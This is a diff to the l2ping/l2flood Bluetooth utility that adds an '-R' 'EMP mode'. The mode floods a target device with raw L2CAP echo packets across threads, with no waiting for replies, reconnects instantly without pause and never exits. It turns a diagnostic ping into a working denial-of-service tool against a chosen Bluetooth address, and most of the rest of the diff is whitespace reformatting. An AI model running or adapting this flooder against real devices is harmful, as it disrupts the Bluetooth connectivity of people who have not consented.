@@ -21,6 +21,8 @@
  *  along with this program; if not, write to the Free Software
  *  Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
  *
+ *  Modified by Ymsniper: added -R (EMP) mode ; fire-and-forget, no response waiting,
+ *  instant reconnect, never exits. Normal mode (-R absent) is unchanged.
  */
 
 #ifdef HAVE_CONFIG_H
@@ -63,6 +65,9 @@ static int timeout = 10;
 static int reverse = 0;
 static int verify = 0;
 
+/* EMP mode flag */
+static int reconnect = 0;   /* -R */
+
 /* Stats */
 static int sent_pkt = 0;
 static int recv_pkt = 0;
@@ -79,7 +84,10 @@ static void stat(int sig)
 	exit(0);
 }
 
-static void ping(char *svr)
+/* ------------------------------------------------------------
+ *  Normal mode – exactly the original l2ping (unchanged)
+ - *----------------------------------------------------------- */
+static void ping_normal(char *svr)
 {
 	struct sigaction sa;
 	struct sockaddr_l2 addr;
@@ -225,25 +233,25 @@ static void ping(char *svr)
 				/* Check payload length */
 				if (recv_cmd->len != size) {
 					fprintf(stderr, "Received %d bytes, expected %d\n",
-						   recv_cmd->len, size);
+							recv_cmd->len, size);
 					goto error;
 				}
 
 				/* Check payload */
 				if (memcmp(&send_buf[L2CAP_CMD_HDR_SIZE],
-						   &recv_buf[L2CAP_CMD_HDR_SIZE], size)) {
+					&recv_buf[L2CAP_CMD_HDR_SIZE], size)) {
 					fprintf(stderr, "Response payload different.\n");
-					goto error;
-				}
+				goto error;
+					}
 			}
 
-#ifdef _OPENMP
+			#ifdef _OPENMP
 			printf("%d bytes from %s id %d time %.2fms thread %d\n", recv_cmd->len, svr,
 				   id - ident, tv2fl(tv_diff), omp_get_thread_num());
-#else
+			#else
 			printf("%d bytes from %s id %d time %.2fms\n", recv_cmd->len, svr,
 				   id - ident, tv2fl(tv_diff));
-#endif
+			#endif
 
 			if (delay)
 				sleep(delay);
@@ -259,30 +267,136 @@ static void ping(char *svr)
 	free(recv_buf);
 	return;
 
-error:
+	error:
 	close(sk);
 	free(send_buf);
 	free(recv_buf);
 	exit(1);
 }
 
+/* ------------------------------------------------------------
+ *  EMP mode (reconnect == 1): fire-and-forget, no response waiting
+ *  - Sends as fast as possible
+ *  - Reconnects instantly on send failure
+ *  - No output until Ctrl+C
+ - *----------------------------------------------------------- */
+static void ping_emp(char *svr)
+{
+	struct sigaction sa;
+	unsigned char *send_buf;
+	uint8_t id = ident;
+	int sk = -1;
+	int i, printed = 0;
+	int reuse = 1;
+	struct linger ling = {1, 0};
+	struct sockaddr_l2 addr;
+
+	memset(&sa, 0, sizeof(sa));
+	sa.sa_handler = stat;
+	sigaction(SIGINT, &sa, NULL);
+
+	send_buf = malloc(L2CAP_CMD_HDR_SIZE + size);
+	if (!send_buf) exit(1);
+
+	for (i = 0; i < size; i++)
+		send_buf[L2CAP_CMD_HDR_SIZE + i] = (i % 40) + 'A';
+
+	while (count == -1 || count-- > 0) {
+		l2cap_cmd_hdr *send_cmd = (l2cap_cmd_hdr *) send_buf;
+
+		/* Hammer connect until success (no sleeps) */
+		while (sk < 0) {
+			sk = socket(PF_BLUETOOTH, SOCK_RAW, BTPROTO_L2CAP);
+			if (sk < 0) continue;
+
+			setsockopt(sk, SOL_SOCKET, SO_REUSEADDR, &reuse, sizeof(reuse));
+			setsockopt(sk, SOL_SOCKET, SO_LINGER, &ling, sizeof(ling));
+
+			memset(&addr, 0, sizeof(addr));
+			addr.l2_family = AF_BLUETOOTH;
+			bacpy(&addr.l2_bdaddr, &bdaddr);
+			if (bind(sk, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
+				close(sk);
+				sk = -1;
+				continue;
+			}
+
+			memset(&addr, 0, sizeof(addr));
+			addr.l2_family = AF_BLUETOOTH;
+			str2ba(svr, &addr.l2_bdaddr);
+			if (connect(sk, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
+				close(sk);
+				sk = -1;
+				continue;
+			}
+
+			if (!printed) {
+				char str[18];
+				socklen_t optlen = sizeof(addr);
+				if (getsockname(sk, (struct sockaddr *)&addr, &optlen) == 0) {
+					ba2str(&addr.l2_bdaddr, str);
+					printf("Ping: %s from %s (data size %d) ...\n", svr, str, size);
+				}
+				printed = 1;
+			}
+		}
+
+		/* Build command header */
+		send_cmd->ident = id;
+		send_cmd->len   = htobs(size);
+		send_cmd->code = reverse ? L2CAP_ECHO_RSP : L2CAP_ECHO_REQ;
+
+		/* Send – if fails, close and hammer reconnect */
+		if (send(sk, send_buf, L2CAP_CMD_HDR_SIZE + size, 0) <= 0) {
+			close(sk);
+			sk = -1;
+			continue;   /* retry same packet */
+		}
+
+		#pragma omp atomic
+		sent_pkt++;
+
+		if (++id > 254) id = ident;
+
+		if (delay == 0) {
+			; /* no sleep – maximum flood */
+		} else {
+			sleep(delay);
+		}
+	}
+
+	if (sk >= 0) close(sk);
+	free(send_buf);
+	stat(0);
+}
+
+/* Wrapper */
+static void ping(char *svr)
+{
+	if (reconnect)
+		ping_emp(svr);
+	else
+		ping_normal(svr);
+}
+
 static void usage(void)
 {
-#ifdef _OPENMP
+	#ifdef _OPENMP
 	printf("l2flood - L2CAP flood\n");
-#else
+	#else
 	printf("l2ping - L2CAP ping\n");
-#endif
+	#endif
 	printf("Usage:\n");
-#ifdef _OPENMP
-	printf("\tl2flood [-i device] [-s size] [-c count] [-t timeout] [-d delay] [-n threads] [-f] [-r] [-v] <bdaddr>\n");
+	#ifdef _OPENMP
+	printf("\tl2flood [-i device] [-s size] [-c count] [-t timeout] [-d delay] [-n threads] [-R] [-f] [-r] [-v] <bdaddr>\n");
 	printf("\t-f  Flood ping (delay = 0); default\n");
-#else
-	printf("\tl2ping [-i device] [-s size] [-c count] [-t timeout] [-d delay] [-f] [-r] [-v] <bdaddr>\n");
+	#else
+	printf("\tl2ping [-i device] [-s size] [-c count] [-t timeout] [-d delay] [-R] [-f] [-r] [-v] <bdaddr>\n");
 	printf("\t-f  Flood ping (delay = 0)\n");
-#endif
+	#endif
 	printf("\t-r  Reverse ping\n");
-	printf("\t-v  Verify request and response payload\n");
+	printf("\t-v  Verify request and response payload (normal mode only)\n");
+	printf("\t-R  EMP MODE: fire-and-forget, no response waiting, instant reconnect, never exits\n");
 }
 
 int main(int argc, char *argv[])
@@ -291,73 +405,77 @@ int main(int argc, char *argv[])
 
 	/* Default options */
 	bacpy(&bdaddr, BDADDR_ANY);
-#ifdef _OPENMP
+	#ifdef _OPENMP
 	threads = sysconf(_SC_NPROCESSORS_ONLN);
-	while ((opt=getopt(argc,argv,"i:d:s:c:t:n:frv")) != EOF) {
-#else
-	while ((opt=getopt(argc,argv,"i:d:s:c:t:frv")) != EOF) {
-#endif
-		switch(opt) {
-		case 'i':
-			if (!strncasecmp(optarg, "hci", 3))
-				hci_devba(atoi(optarg + 3), &bdaddr);
-			else
-				str2ba(optarg, &bdaddr);
-			break;
+	while ((opt=getopt(argc,argv,"i:d:s:c:t:n:Rfrv")) != EOF) {
+		#else
+		while ((opt=getopt(argc,argv,"i:d:s:c:t:Rfrv")) != EOF) {
+			#endif
+			switch(opt) {
+				case 'i':
+					if (!strncasecmp(optarg, "hci", 3))
+						hci_devba(atoi(optarg + 3), &bdaddr);
+				else
+					str2ba(optarg, &bdaddr);
+				break;
 
-		case 'd':
-			delay = atoi(optarg);
-			break;
+				case 'd':
+					delay = atoi(optarg);
+					break;
 
-		case 'f':
-			/* Kinda flood ping */
-			delay = 0;
-			break;
+				case 'f':
+					/* Kinda flood ping */
+					delay = 0;
+					break;
 
-		case 'r':
-			/* Use responses instead of requests */
-			reverse = 1;
-			break;
+				case 'r':
+					/* Use responses instead of requests */
+					reverse = 1;
+					break;
 
-		case 'v':
-			verify = 1;
-			break;
+				case 'v':
+					verify = 1;
+					break;
 
-		case 'c':
-			count = atoi(optarg);
-			break;
+				case 'c':
+					count = atoi(optarg);
+					break;
 
-		case 't':
-			timeout = atoi(optarg);
-			break;
+				case 't':
+					timeout = atoi(optarg);
+					break;
 
-		case 's':
-			size = atoi(optarg);
-			break;
+				case 's':
+					size = atoi(optarg);
+					break;
 
-#ifdef _OPENMP
-		case 'n':
-			threads = atoi(optarg);
-			break;
-#endif
+				case 'R':
+					reconnect = 1;
+					break;
 
-		default:
+					#ifdef _OPENMP
+				case 'n':
+					threads = atoi(optarg);
+					break;
+					#endif
+
+				default:
+					usage();
+					exit(1);
+			}
+		}
+
+		if (!(argc - optind)) {
 			usage();
 			exit(1);
 		}
-	}
 
-	if (!(argc - optind)) {
-		usage();
-		exit(1);
-	}
+		#ifdef _OPENMP
+		#pragma omp parallel num_threads(threads)
+		#endif
+		{
+			ping(argv[optind]);
+		}
 
-#ifdef _OPENMP
-	#pragma omp parallel num_threads(threads)
-#endif
-	{
-		ping(argv[optind]);
+		return 0;
 	}
-
-	return 0;
-}
